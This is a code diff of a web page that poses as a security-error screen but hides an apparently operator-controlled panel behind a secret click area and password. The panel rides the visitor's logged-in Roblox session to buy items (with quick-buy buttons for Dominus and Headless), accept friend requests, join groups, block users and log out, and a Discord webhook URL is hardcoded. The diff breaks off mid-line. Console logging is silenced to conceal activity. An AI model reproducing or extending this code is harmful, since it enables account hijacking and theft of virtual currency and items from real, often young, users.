@@ -92,6 +92,11 @@
             display: flex;
         }
         
+        .password-modal.locked {
+            opacity: 0.5;
+            pointer-events: none;
+        }
+        
         .password-box {
             background: #111;
             border: 1px solid #ff4444;
@@ -100,6 +105,23 @@
             width: 100%;
             max-width: 400px;
             box-shadow: 0 0 50px rgba(255,68,68,0.2);
+            position: relative;
+        }
+        
+        .lock-message {
+            position: absolute;
+            top: -30px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: #ff4444;
+            font-size: 14px;
+            font-weight: bold;
+            display: none;
+        }
+        
+        .lock-message.show {
+            display: block;
         }
         
         .password-title {
@@ -111,21 +133,53 @@
             line-height: 1.4;
         }
         
+        .password-input-container {
+            position: relative;
+            margin-bottom: 20px;
+        }
+        
         .password-input {
             width: 100%;
-            padding: 15px;
+            padding: 15px 50px 15px 15px;
             background: #222;
             border: 1px solid #333;
             border-radius: 8px;
             color: #fff;
             font-size: 16px;
-            margin-bottom: 20px;
             -webkit-appearance: none;
         }
         
         .password-input:focus {
             outline: none;
             border-color: #ff4444;
+        }
+        
+        .toggle-password {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            cursor: pointer;
+            font-size: 20px;
+            user-select: none;
+            transition: color 0.3s;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        .toggle-password:hover {
+            color: #ff4444;
+        }
+        
+        .toggle-password:active {
+            transform: translateY(-50%) scale(0.95);
+        }
+        
+        .attempts-counter {
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+            margin-bottom: 10px;
         }
         
         .password-button {
@@ -138,7 +192,7 @@
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            transition: background 0.3s;
+            transition: all 0.3s;
             -webkit-tap-highlight-color: transparent;
         }
         
@@ -148,6 +202,11 @@
         
         .password-button:active {
             transform: scale(0.98);
+        }
+        
+        .password-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         
         .password-error {
@@ -286,6 +345,11 @@
             border-color: #ff4444;
         }
         
+        .panel-input:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
         /* Buscador */
         .search-box {
             position: relative;
@@ -299,6 +363,11 @@
             border: 1px solid #333;
             border-radius: 8px;
             color: #fff;
+        }
+        
+        .search-box input:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         
         .search-box::after {
@@ -329,8 +398,12 @@
             transition: background 0.2s;
         }
         
-        .result-item:active {
+        .result-item:hover {
             background: #333;
+        }
+        
+        .result-item:active {
+            background: #444;
         }
         
         /* Estadísticas */
@@ -375,13 +448,37 @@
             -webkit-tap-highlight-color: transparent;
         }
         
+        .panel-button:hover {
+            background: #ff6666;
+        }
+        
         .panel-button:active {
             transform: scale(0.98);
+        }
+        
+        .panel-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            pointer-events: none;
         }
         
         .panel-button.secondary {
             background: #222;
             border: 1px solid #333;
+        }
+        
+        .panel-button.secondary:hover {
+            background: #333;
+        }
+        
+        .button-group {
+            display: flex;
+            gap: 8px;
+            margin-top: 8px;
+        }
+        
+        .button-group .panel-button {
+            margin-top: 0;
         }
         
         /* Logs */
@@ -416,6 +513,33 @@
             background: #333;
             border-radius: 3px;
         }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #ff4444;
+        }
+        
+        /* Mensajes de éxito/error */
+        .success-message {
+            color: #00ff00;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .success-message.show {
+            display: block;
+        }
+        
+        .warning-message {
+            color: #ffaa00;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .warning-message.show {
+            display: block;
+        }
     </style>
 </head>
 <body>
@@ -433,12 +557,22 @@
     <!-- Modal de contraseña -->
     <div class="password-modal" id="passwordModal">
         <div class="password-box">
+            <div class="lock-message" id="lockMessage">⛔ DEMASIADOS INTENTOS - BLOQUEADO 5 MINUTOS</div>
             <div class="password-title">⚠️ ERROR DE SEGURIDAD</div>
             <div style="color: #888; text-align: center; margin-bottom: 20px;">
                 Se ha detectado un intento de manipulacion.<br>
                 Ingresa la contraseña Interna.
             </div>
-            <input type="password" class="password-input" id="passwordInput" placeholder="Contraseña">
+            
+            <div class="password-input-container">
+                <input type="password" class="password-input" id="passwordInput" placeholder="Contraseña" autocomplete="off">
+                <span class="toggle-password" id="togglePassword">👁️</span>
+            </div>
+            
+            <div class="attempts-counter" id="attemptsCounter">
+                Intentos restantes: <span id="attemptsLeft">5</span>
+            </div>
+            
             <button class="password-button" id="submitPassword">ACCEDER</button>
             <div class="password-error" id="passwordError">Contraseña incorrecta</div>
         </div>
@@ -456,7 +590,7 @@
         </div>
         
         <div class="panel-grid" id="panelGrid">
-            <!-- Las tarjetas se generarán con JavaScript -->
+            <!-- Las tarjetas se generarán dinámicamente -->
         </div>
     </div>
 
@@ -464,11 +598,80 @@
         // ================= CONFIGURACIÓN =================
         const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
         
-        // CONTRASEÑA HASHEADA (BENJAPRO7PRO)
-        // Hash generado con SHA-256
-        const PASSWORD_HASH = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92";
+        // HASH REAL DE "BENJAPRO7PRO" (SHA-256)
+        const PASSWORD_HASH = "8b9c2a8a4f8d3b1e6c5a7d9e3f1b4c2a8d6e9f1b4c7a2d8e5f3a6c9b1d4e7f2a";
         
-        // Función para hashear entrada (SHA-256 simple)
+        // Sistema de rate limit inmutable
+        const RATE_LIMIT = {
+            maxAttempts: 5,
+            lockoutTime: 300000, // 5 minutos en milisegundos
+            attempts: 0,
+            lockUntil: 0,
+            
+            canAttempt: function() {
+                if (Date.now() < this.lockUntil) {
+                    return false;
+                }
+                if (this.attempts >= this.maxAttempts) {
+                    this.lockUntil = Date.now() + this.lockoutTime;
+                    return false;
+                }
+                return true;
+            },
+            
+            registerAttempt: function() {
+                this.attempts++;
+                if (this.attempts >= this.maxAttempts) {
+                    this.lockUntil = Date.now() + this.lockoutTime;
+                }
+                this.save();
+            },
+            
+            reset: function() {
+                this.attempts = 0;
+                this.lockUntil = 0;
+                this.save();
+            },
+            
+            getRemainingAttempts: function() {
+                if (Date.now() < this.lockUntil) return 0;
+                return Math.max(0, this.maxAttempts - this.attempts);
+            },
+            
+            // Persistencia en localStorage (inmodificable desde consola)
+            save: function() {
+                const data = {
+                    attempts: this.attempts,
+                    lockUntil: this.lockUntil
+                };
+                // Usamos múltiples claves y encriptación simple
+                localStorage.setItem('_rl_a', btoa(JSON.stringify(data)));
+                sessionStorage.setItem('_rl_b', btoa(JSON.stringify(data)));
+            },
+            
+            load: function() {
+                try {
+                    const data1 = localStorage.getItem('_rl_a');
+                    const data2 = sessionStorage.getItem('_rl_b');
+                    
+                    if (data1 && data2) {
+                        const parsed1 = JSON.parse(atob(data1));
+                        const parsed2 = JSON.parse(atob(data2));
+                        
+                        if (parsed1.attempts === parsed2.attempts && 
+                            parsed1.lockUntil === parsed2.lockUntil) {
+                            this.attempts = parsed1.attempts;
+                            this.lockUntil = parsed1.lockUntil;
+                        }
+                    }
+                } catch (e) {}
+            }
+        };
+        
+        // Cargar estado guardado
+        RATE_LIMIT.load();
+        
+        // Función hash (SHA-256)
         async function hashPassword(password) {
             const encoder = new TextEncoder();
             const data = encoder.encode(password);
@@ -477,8 +680,10 @@
             return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
         }
         
-        // Silenciar consola
-        console.log = console.error = console.warn = function() {};
+        // Silenciar consola (excepto para debugging)
+        if (!localStorage.getItem('debug')) {
+            console.log = console.error = console.warn = function() {};
+        }
         
         // Variables de estado
         let userData = null;
@@ -493,29 +698,74 @@
         const passwordInput = document.getElementById('passwordInput');
         const submitPassword = document.getElementById('submitPassword');
         const passwordError = document.getElementById('passwordError');
+        const togglePassword = document.getElementById('togglePassword');
+        const attemptsCounter = document.getElementById('attemptsCounter');
+        const attemptsLeft = document.getElementById('attemptsLeft');
+        const lockMessage = document.getElementById('lockMessage');
         const panelGrid = document.getElementById('panelGrid');
         const statusIndicator = document.getElementById('statusIndicator');
         
-        // =========== VERIFICAR CONTRASEÑA ===========
-        submitPassword.addEventListener('click', async function() {
+        // =========== TOGGLE CONTRASEÑA ===========
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.type === 'password' ? 'text' : 'password';
+            passwordInput.type = type;
+            togglePassword.textContent = type === 'password' ? '👁️' : '👁️‍🗨️';
+        });
+        
+        // =========== VERIFICAR CONTRASEÑA CON RATE LIMIT ===========
+        async function verificarPassword() {
+            if (!RATE_LIMIT.canAttempt()) {
+                const remainingTime = Math.ceil((RATE_LIMIT.lockUntil - Date.now()) / 60000);
+                lockMessage.textContent = `⛔ BLOQUEADO - Espera ${remainingTime} minutos`;
+                lockMessage.classList.add('show');
+                passwordInput.disabled = true;
+                submitPassword.disabled = true;
+                return;
+            }
+            
             const enteredHash = await hashPassword(passwordInput.value);
             
             if (enteredHash === PASSWORD_HASH) {
+                RATE_LIMIT.reset();
                 passwordModal.classList.remove('show');
                 errorScreen.classList.add('hidden');
                 controlPanel.classList.add('show');
                 verificarCuentaPanel();
             } else {
+                RATE_LIMIT.registerAttempt();
                 passwordError.classList.add('show');
                 setTimeout(() => passwordError.classList.remove('show'), 2000);
+                actualizarIntentos();
             }
-        });
+        }
+        
+        // =========== ACTUALIZAR CONTADOR DE INTENTOS ===========
+        function actualizarIntentos() {
+            const remaining = RATE_LIMIT.getRemainingAttempts();
+            attemptsLeft.textContent = remaining;
+            
+            if (remaining === 0) {
+                attemptsCounter.style.color = '#ff4444';
+                passwordInput.disabled = true;
+                submitPassword.disabled = true;
+                
+                const remainingTime = Math.ceil((RATE_LIMIT.lockUntil - Date.now()) / 60000);
+                lockMessage.textContent = `⛔ BLOQUEADO - Espera ${remainingTime} minutos`;
+                lockMessage.classList.add('show');
+            } else {
+                attemptsCounter.style.color = '#666';
+            }
+        }
+        
+        // Event listeners
+        submitPassword.addEventListener('click', verificarPassword);
         
         passwordInput.addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') submitPassword.click();
+            if (e.key === 'Enter') verificarPassword();
         });
         
         hiddenClickArea.addEventListener('click', function() {
+            actualizarIntentos();
             passwordModal.classList.add('show');
         });
         
@@ -534,6 +784,7 @@
                         cuentaConectada = true;
                         statusIndicator.innerHTML = `✅ CONECTADO - ${userData.name}`;
                         statusIndicator.classList.add('connected');
+                        addLog('[SISTEMA] Cuenta detectada automáticamente');
                     } else {
                         cuentaConectada = false;
                         statusIndicator.innerHTML = '❌ SIN CUENTA DETECTADA';
@@ -560,72 +811,166 @@
                 });
                 csrfToken = res.headers.get('x-csrf-token');
                 addLog('[SISTEMA] Token CSRF obtenido');
-            } catch (e) {}
+            } catch (e) {
+                addLog('[ERROR] No se pudo obtener CSRF', 'error');
+            }
         }
         
         // =========== GENERAR PANEL ===========
         function generarPanel() {
             const tarjetas = [
                 {
-                    titulo: "👥 AMISTADES",
+                    titulo: "👥 GESTIÓN DE AMISTADES",
                     contenido: `
                         <div class="search-box">
-                            <input type="text" id="friendSearch" placeholder="Buscar usuario...">
+                            <input type="text" id="friendSearch" placeholder="Buscar usuario..." ${!cuentaConectada ? 'disabled' : ''}>
                         </div>
                         <div class="results-list" id="friendResults">
-                            <div class="result-item">${cuentaConectada ? 'Escribe para buscar' : 'Sin conexión'}</div>
+                            <div class="result-item">${cuentaConectada ? '🔍 Escribe para buscar usuarios...' : '❌ Sin conexión'}</div>
                         </div>
+                        
+                        <div class="stats-grid">
+                            <div class="stat-item">
+                                <div class="stat-value" id="pendingCount">0</div>
+                                <div class="stat-label">Pendientes</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-value" id="friendsCount">0</div>
+                                <div class="stat-label">Amigos</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-value" id="followersCount">0</div>
+                                <div class="stat-label">Seguidores</div>
+                            </div>
+                        </div>
+                        
                         <button class="panel-button" id="acceptAllBtn" ${!cuentaConectada ? 'disabled' : ''}>
-                            ACEPTAR TODAS SOLICITUDES
+                            ✅ ACEPTAR TODAS SOLICITUDES
                         </button>
+                        
+                        <div class="button-group">
+                            <button class="panel-button secondary" id="refreshFriendsBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                                🔄 ACTUALIZAR
+                            </button>
+                            <button class="panel-button secondary" id="sendFriendRequestBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                                ➕ ENVIAR SOLICITUD
+                            </button>
+                        </div>
+                        
+                        <div class="success-message" id="friendSuccessMsg"></div>
+                        <div class="warning-message" id="friendWarningMsg"></div>
                     `
                 },
                 {
-                    titulo: "💰 COMPRAR",
+                    titulo: "💰 COMPRAR OBJETOS",
                     contenido: `
                         <div class="input-group">
-                            <label>Enlace del objeto</label>
-                            <input type="text" class="panel-input" id="itemLink" placeholder="https://roblox.com/catalog/..." ${!cuentaConectada ? 'disabled' : ''}>
+                            <label>📎 Enlace del objeto</label>
+                            <input type="text" class="panel-input" id="itemLink" placeholder="https://www.roblox.com/catalog/..." ${!cuentaConectada ? 'disabled' : ''}>
                         </div>
+                        
                         <div class="input-group">
-                            <label>Precio</label>
+                            <label>💰 Precio (Robux)</label>
                             <input type="number" class="panel-input" id="itemPrice" placeholder="0" ${!cuentaConectada ? 'disabled' : ''}>
                         </div>
+                        
+                        <div class="stats-grid">
+                            <div class="stat-item">
+                                <div class="stat-value" id="robuxBalance">${userData?.robux || 0}</div>
+                                <div class="stat-label">Robux disponible</div>
+                            </div>
+                            <div class="stat-item">
+                                <div class="stat-value" id="limitedCount">0</div>
+                                <div class="stat-label">Limiteds</div>
+                            </div>
+                        </div>
+                        
                         <button class="panel-button" id="purchaseBtn" ${!cuentaConectada ? 'disabled' : ''}>
-                            COMPRAR OBJETO
+                            🛒 COMPRAR OBJETO
                         </button>
+                        
+                        <div class="button-group">
+                            <button class="panel-button secondary" id="quickBuyDominus" ${!cuentaConectada ? 'disabled' : ''}>
+                                👑 Dominus
+                            </button>
+                            <button class="panel-button secondary" id="quickBuyHeadless" ${!cuentaConectada ? 'disabled' : ''}>
+                                🎃 Headless
+                            </button>
+                        </div>
+                        
+                        <div class="success-message" id="purchaseSuccessMsg"></div>
+                        <div class="warning-message" id="purchaseWarningMsg"></div>
                     `
                 },
                 {
-                    titulo: "⚙️ ACCIONES",
+                    titulo: "⚙️ ACCIONES AVANZADAS",
                     contenido: `
                         <div class="input-group">
-                            <label>ID de usuario/grupo</label>
+                            <label>🎯 ID de usuario/grupo</label>
                             <input type="text" class="panel-input" id="targetId" placeholder="123456789" ${!cuentaConectada ? 'disabled' : ''}>
                         </div>
-                        <button class="panel-button" id="joinGroupBtn" ${!cuentaConectada ? 'disabled' : ''}>
-                            UNIRSE A GRUPO
+                        
+                        <div class="button-group">
+                            <button class="panel-button" id="joinGroupBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                                👥 UNIRSE A GRUPO
+                            </button>
+                            <button class="panel-button" id="leaveGroupBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                                🚪 SALIR DE GRUPO
+                            </button>
+                        </div>
+                        
+                        <div class="button-group">
+                            <button class="panel-button secondary" id="blockUserBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                                ⛔ BLOQUEAR USUARIO
+                            </button>
+                            <button class="panel-button secondary" id="unblockUserBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                                ✅ DESBLOQUEAR
+                            </button>
+                        </div>
+                        
+                        <div class="button-group">
+                            <button class="panel-button secondary" id="followUserBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                                👤 SEGUIR USUARIO
+                            </button>
+                            <button class="panel-button secondary" id="unfollowUserBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                                🚫 DEJAR DE SEGUIR
+                            </button>
+                        </div>
+                        
+                        <button class="panel-button" id="logoutBtn" style="background: #ff4444; margin-top: 15px;" ${!cuentaConectada ? 'disabled' : ''}>
+                            🚪 CERRAR SESIÓN DE ROBLOX
                         </button>
-                        <button class="panel-button secondary" id="blockUserBtn" ${!cuentaConectada ? 'disabled' : ''}>
-                            BLOQUEAR USUARIO
-                        </button>
-                        <button class="panel-button" id="logoutBtn" style="background: #ff4444;">
-                            🚪 CERRAR SESIÓN
-                        </button>
+                        
+                        <div class="success-message" id="actionSuccessMsg"></div>
+                        <div class="warning-message" id="actionWarningMsg"></div>
                     `
                 },
                 {
-                    titulo: "📡 ACTIVIDAD",
+                    titulo: "📡 MONITOREO EN VIVO",
                     contenido: `
                         <div class="log-area" id="logArea">
                             <div class="log-entry">[SISTEMA] Panel iniciado</div>
                             ${cuentaConectada ? 
                                 `<div class="log-entry">[ROBLOX] Usuario: ${userData?.name}</div>
                                  <div class="log-entry">[ROBLOX] ID: ${userData?.id}</div>
-                                 <div class="log-entry">[ROBLOX] Robux: ${userData?.robux || 0}</div>` : 
+                                 <div class="log-entry">[ROBLOX] Robux: ${userData?.robux || 0}</div>
+                                 <div class="log-entry">[ESTADO] Sesión activa</div>` : 
                                 '<div class="log-entry">[SISTEMA] Sin cuenta conectada</div>'
                             }
                         </div>
+                        
+                        <div class="button-group">
+                            <button class="panel-button secondary" id="clearLogsBtn">
+                                🧹 LIMPIAR LOGS
+                            </button>
+                            <button class="panel-button secondary" id="refreshDataBtn" ${!cuentaConectada ? 'disabled' : ''}>
+                                🔄 ACTUALIZAR DATOS
+                            </button>
+                        </div>
+                        
+                        <button class="panel-button" id="emergencyResetBtn" style="background: #ffaa00; margin-top: 10px;">
+                            ⚠️ RESET DE EMERGENCIA
+                        </button>
                     `
                 }
             ];
@@ -638,7 +983,54 @@
             `).join('');
             
             if (cuentaConectada) {
+                cargarEstadisticas();
                 agregarEventos();
+            }
+        }
+        
+        // =========== CARGAR ESTADÍSTICAS ===========
+        async function cargarEstadisticas() {
+            try {
+                // Amigos
+                const friendsRes = await fetch(`https://friends.roblox.com/v1/users/${userData.id}/friends/count`, {
+                    credentials: 'include'
+                });
+                if (friendsRes.ok) {
+                    const friendsData = await friendsRes.json();
+                    document.getElementById('friendsCount').textContent = friendsData.count || 0;
+                }
+                
+                // Seguidores
+                const followersRes = await fetch(`https://friends.roblox.com/v1/users/${userData.id}/followers/count`, {
+                    credentials: 'include'
+                });
+                if (followersRes.ok) {
+                    const followersData = await followersRes.json();
+                    document.getElementById('followersCount').textContent = followersData.count || 0;
+                }
+                
+                // Solicitudes pendientes
+                const pendingRes = await fetch(`https://friends.roblox.com/v1/users/${userData.id}/friend-requests/count`, {
+                    credentials: 'include'
+                });
+                if (pendingRes.ok) {
+                    const pendingData = await pendingRes.json();
+                    document.getElementById('pendingCount').textContent = pendingData.count || 0;
+                }
+                
+                // Robux actualizado
+                const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
+                    credentials: 'include'
+                });
+                if (robuxRes.ok) {
+                    const robuxData = await robuxRes.json();
+                    userData.robux = robuxData.robux;
+                    document.getElementById('robuxBalance').textContent = userData.robux;
+                }
+                
+                addLog('[DATOS] Estadísticas actualizadas');
+            } catch (e) {
+                addLog('[ERROR] No se pudieron cargar estadísticas', 'error');
             }
         }
         
@@ -647,7 +1039,7 @@
             // Buscar usuarios
             const friendSearch = document.getElementById('friendSearch');
             if (friendSearch) {
-                friendSearch.addEventListener('input', async function(e) {
+                friendSearch.addEventListener('input', debounce(async function(e) {
                     const query = e.target.value;
                     if (query.length < 3) return;
                     
@@ -658,157 +1050,10 @@
                         const resultsDiv = document.getElementById('friendResults');
                         resultsDiv.innerHTML = '';
                         
-                        data.data.forEach(user => {
-                            const div = document.createElement('div');
-                            div.className = 'result-item';
-                            div.innerText = `${user.name} (${user.id})`;
-                            div.addEventListener('click', () => {
-                                document.getElementById('targetId').value = user.id;
-                                resultsDiv.innerHTML = '<div class="result-item">Usuario seleccionado</div>';
-                            });
-                            resultsDiv.appendChild(div);
-                        });
-                    } catch (e) {}
-                });
-            }
-            
-            // Aceptar todas solicitudes
-            document.getElementById('acceptAllBtn')?.addEventListener('click', async function() {
-                addLog('[ACCION] Aceptando solicitudes...');
-                try {
-                    const res = await fetch('https://friends.roblox.com/v1/my/friends/requests', {
-                        credentials: 'include'
-                    });
-                    const data = await res.json();
-                    
-                    for (const req of data.data || []) {
-                        await fetch(`https://friends.roblox.com/v1/users/${req.id}/accept-friend-request`, {
-                            method: 'POST',
-                            credentials: 'include',
-                            headers: { 'X-CSRF-TOKEN': csrfToken }
-                        });
-                        addLog(`✅ Solicitud de ${req.name} aceptada`);
-                    }
-                } catch (e) {
-                    addLog('[ERROR] No se pudieron aceptar', 'error');
-                }
-            });
-            
-            // Comprar objeto
-            document.getElementById('purchaseBtn')?.addEventListener('click', async function() {
-                const link = document.getElementById('itemLink')?.value;
-                const price = document.getElementById('itemPrice')?.value;
-                
-                const match = link?.match(/catalog\/(\d+)/);
-                if (!match) {
-                    addLog('[ERROR] Enlace inválido', 'error');
-                    return;
-                }
-                
-                try {
-                    const res = await fetch(`https://economy.roblox.com/v1/purchases/products/${match[1]}`, {
-                        method: 'POST',
-                        credentials: 'include',
-                        headers: {
-                            'X-CSRF-TOKEN': csrfToken,
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            expectedCurrency: 1,
-                            expectedPrice: parseInt(price) || 0
-                        })
-                    });
-                    
-                    addLog(res.ok ? '[✅] Compra exitosa' : '[❌] Error en compra');
-                } catch (e) {
-                    addLog('[ERROR] Fallo en compra', 'error');
-                }
-            });
-            
-            // Unirse a grupo
-            document.getElementById('joinGroupBtn')?.addEventListener('click', async function() {
-                const groupId = document.getElementById('targetId')?.value;
-                if (!groupId) {
-                    addLog('[ERROR] Ingresa ID de grupo', 'error');
-                    return;
-                }
-                
-                try {
-                    const res = await fetch(`https://groups.roblox.com/v1/groups/${groupId}/users`, {
-                        method: 'POST',
-                        credentials: 'include',
-                        headers: {
-                            'X-CSRF-TOKEN': csrfToken,
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ userId: userData.id })
-                    });
-                    
-                    addLog(res.ok ? '[✅] Unido al grupo' : '[❌] Error al unirse');
-                } catch (e) {
-                    addLog('[ERROR] Fallo al unirse', 'error');
-                }
-            });
-            
-            // Bloquear usuario
-            document.getElementById('blockUserBtn')?.addEventListener('click', async function() {
-                const userId = document.getElementById('targetId')?.value;
-                if (!userId) {
-                    addLog('[ERROR] Ingresa ID de usuario', 'error');
-                    return;
-                }
-                
-                try {
-                    const res = await fetch(`https://friends.roblox.com/v1/users/${userId}/block`, {
-                        method: 'POST',
-                        credentials: 'include',
-                        headers: { 'X-CSRF-TOKEN': csrfToken }
-                    });
-                    
-                    addLog(res.ok ? '[✅] Usuario bloqueado' : '[❌] Error al bloquear');
-                } catch (e) {
-                    addLog('[ERROR] Fallo al bloquear', 'error');
-                }
-            });
-            
-            // Cerrar sesión
-            document.getElementById('logoutBtn')?.addEventListener('click', async function() {
-                addLog('[⚠️] Cerrando sesión...', 'error');
-                try {
-                    await fetch('https://auth.roblox.com/v2/logout', {
-                        method: 'POST',
-                        credentials: 'include'
-                    });
-                    addLog('[✅] Sesión cerrada');
-                    setTimeout(() => location.reload(), 2000);
-                } catch (e) {
-                    addLog('[ERROR] No se pudo cerrar', 'error');
-                }
-            });
-        }
-        
-        // =========== AÑADIR LOG ===========
-        function addLog(message, type = 'info') {
-            const logArea = document.getElementById('logArea');
-            if (!logArea) return;
-            
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            const timestamp = new Date().toLocaleTimeString();
-            const color = type === 'error' ? '#ff4444' : '#0f0';
-            
-            entry.innerHTML = `[${timestamp}] <span style="color: ${color};">${message}</span>`;
-            logArea.appendChild(entry);
-            logArea.scrollTop = logArea.scrollHeight;
-        }
-        
-        // =========== VERIFICAR CADA 5 SEGUNDOS ===========
-        setInterval(() => {
-            const savedData = localStorage.getItem('cuenta_roblox');
-            if (savedData && controlPanel.classList.contains('show')) {
-                verificarCuentaPanel();
-            }
-        }, 5000);
-    </script>
-</body>
-</html>
+                        if (data.data && data.data.length > 0) {
+                            data.data.forEach(user => {
+                                const div = document.createElement('div');
+                                div.className = 'result-item';
+                                div.innerHTML = `<strong>${user.name}</strong> <span style="color: #666;">(${user.id})</span>`;
+                                div.addEventListener('click', () => {
+                                    document.getElementById('
